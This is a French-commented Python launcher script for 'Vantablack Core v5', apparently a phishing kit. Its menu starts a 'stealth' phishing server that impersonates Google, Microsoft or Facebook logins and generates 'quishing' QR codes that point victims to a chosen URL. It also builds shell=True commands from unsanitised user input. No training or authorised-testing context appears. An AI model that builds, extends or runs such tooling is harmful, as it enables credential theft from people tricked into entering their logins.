#!/usr/bin/env python3
"""
Vantablack Core v5 - Script de démarrage rapide
Menu interactif pour les opérations courantes
"""

import os
import sys
import subprocess
import time
from pathlib import Path

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class QuickStart:
    def __init__(self):
        self.project_root = Path(__file__).parent
        self.venv_path = self.project_root / ".venv"
        
    def run_command(self, cmd, check=True):
        """Exécute une commande"""
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, shell=True, cwd=self.project_root)
            if result.returncode != 0 and check:
                print(f"{Colors.RED}❌ Erreur: {result.stderr}{Colors.RESET}")
                return False
            return True
        except Exception as e:
            print(f"{Colors.RED}❌ Exception: {e}{Colors.RESET}")
            return False
    
    def get_venv_python(self):
        """Retourne le python du venv"""
        if sys.platform == "win32":
            return str(self.venv_path / "Scripts" / "python.exe")
        else:
            return str(self.venv_path / "bin" / "python")
    
    def check_venv(self):
        """Vérifie si le venv existe"""
        return self.venv_path.exists()
    
    def setup_venv(self):
        """Configure l'environnement virtuel"""
        if self.check_venv():
            print(f"{Colors.YELLOW}⚠ Environnement virtuel existe déjà{Colors.RESET}")
            return True
        
        print(f"{Colors.BLUE}🐍 Création de l'environnement virtuel...{Colors.RESET}")
        return self.run_command(f"{sys.executable} -m venv {self.venv_path}")
    
    def install_deps(self):
        """Installe les dépendances"""
        if not self.check_venv():
            print(f"{Colors.RED}❌ Veuillez d'abord créer l'environnement virtuel{Colors.RESET}")
            return False
        
        pip_cmd = self.get_venv_python() + " -m pip install -r requirements.txt"
        print(f"{Colors.BLUE}📦 Installation des dépendances...{Colors.RESET}")
        return self.run_command(pip_cmd)
    
    def launch_phishing(self, target="google"):
        """Lance le serveur phishing"""
        if not self.check_venv():
            print(f"{Colors.RED}❌ Environnement virtuel requis{Colors.RESET}")
            return False
        
        python_cmd = self.get_venv_python()
        cmd = f"{python_cmd} phishing_server.py --target {target} --port 8080 --stealth"
        
        print(f"{Colors.BLUE}🌐 Lancement du serveur {target}...{Colors.RESET}")
        print(f"{Colors.CYAN}URL: http://localhost:8080{Colors.RESET}")
        
        return self.run_command(cmd, check=False)
    
    def generate_qr(self, url, logo=None):
        """Génère un QR code"""
        if not self.check_venv():
            print(f"{Colors.RED}❌ Environnement virtuel requis{Colors.RESET}")
            return False
        
        python_cmd = self.get_venv_python()
        cmd = f"{python_cmd} quishing.py --url {url}"
        
        if logo:
            cmd += f" --logo {logo}"
        
        print(f"{Colors.BLUE}📱 Génération du QR code...{Colors.RESET}")
        return self.run_command(cmd)
    
    def run_tests(self):
        """Exécute les tests"""
        if not self.check_venv():
            print(f"{Colors.RED}❌ Environnement virtuel requis{Colors.RESET}")
            return False
        
        python_cmd = self.get_venv_python()
        cmd = f"{python_cmd} -m pytest core/tests/ -v"
        
        print(f"{Colors.BLUE}🧪 Exécution des tests...{Colors.RESET}")
        return self.run_command(cmd)
    
    def show_menu(self):
        """Affiche le menu principal"""
        while True:
            print(f"\n{Colors.BOLD}{Colors.MAGENTA}=== VANTABLACK CORE v5 - DÉMARRAGE RAPIDE ==={Colors.RESET}")
            print(f"{Colors.GREEN}1.{Colors.RESET} Installation complète automatique")
            print(f"{Colors.GREEN}2.{Colors.RESET} Créer environnement virtuel")
            print(f"{Colors.GREEN}3.{Colors.RESET} Installer dépendances")
            print(f"{Colors.GREEN}4.{Colors.RESET} Lancer serveur phishing")
            print(f"{Colors.GREEN}5.{Colors.RESET} Générer QR code")
            print(f"{Colors.GREEN}6.{Colors.RESET} Exécuter tests")
            print(f"{Colors.GREEN}7.{Colors.RESET} Menu avancé (setup.py)")
            print(f"{Colors.GREEN}0.{Colors.RESET} Quitter")
            
            choice = input(f"\n{Colors.YELLOW}➤ Choisissez une option (0-7): {Colors.RESET}").strip()
            
            if choice == "1":
                self.full_setup()
            elif choice == "2":
                self.setup_venv()
            elif choice == "3":
                self.install_deps()
            elif choice == "4":
                target = input(f"{Colors.YELLOW}➤ Target (google/microsoft/facebook): {Colors.RESET}").strip() or "google"
                self.launch_phishing(target)
            elif choice == "5":
                url = input(f"{Colors.YELLOW}➤ URL pour le QR code: {Colors.RESET}").strip()
                if url:
                    self.generate_qr(url)
                else:
                    print(f"{Colors.RED}❌ URL requise{Colors.RESET}")
            elif choice == "6":
                self.run_tests()
            elif choice == "7":
                self.run_command(f"{sys.executable} setup.py")
            elif choice == "0":
                print(f"{Colors.GREEN}👋 Au revoir!{Colors.RESET}")
                break
            else:
                print(f"{Colors.RED}❌ Option invalide{Colors.RESET}")
    
    def full_setup(self):
        """Installation complète automatique"""
        print(f"{Colors.BOLD}🚀 Installation complète automatique{Colors.RESET}")
        
        steps = [
            ("Création environnement virtuel", self.setup_venv),
            ("Installation dépendances", self.install_deps),
            ("Vérification installation", self.run_tests),
        ]
        
        for step_name, step_func in steps:
            print(f"\n{Colors.BLUE}▶ {step_name}...{Colors.RESET}")
            if not step_func():
                print(f"{Colors.RED}❌ Échec à l'étape: {step_name}{Colors.RESET}")
                return False
            time.sleep(1)
        
        print(f"\n{Colors.GREEN}✅ Installation complète réussie!{Colors.RESET}")
        print(f"{Colors.CYAN}Prochaines étapes:{Colors.RESET}")
        print(f"  - Lancer un serveur: python start.py -> option 4")
        print(f"  - Générer un QR code: python start.py -> option 5")
        print(f"  - Menu complet: python setup.py")
        
        return True

def main():
    """Point d'entrée principal"""
    print(f"{Colors.BOLD}{Colors.CYAN}Vantablack Core v5 - Démarrage Rapide{Colors.RESET}")
    print(f"{Colors.YELLOW}Script interactif pour les opérations courantes{Colors.RESET}")
    
    quickstart = QuickStart()
    quickstart.show_menu()

if __name__ == "__main__":
    main()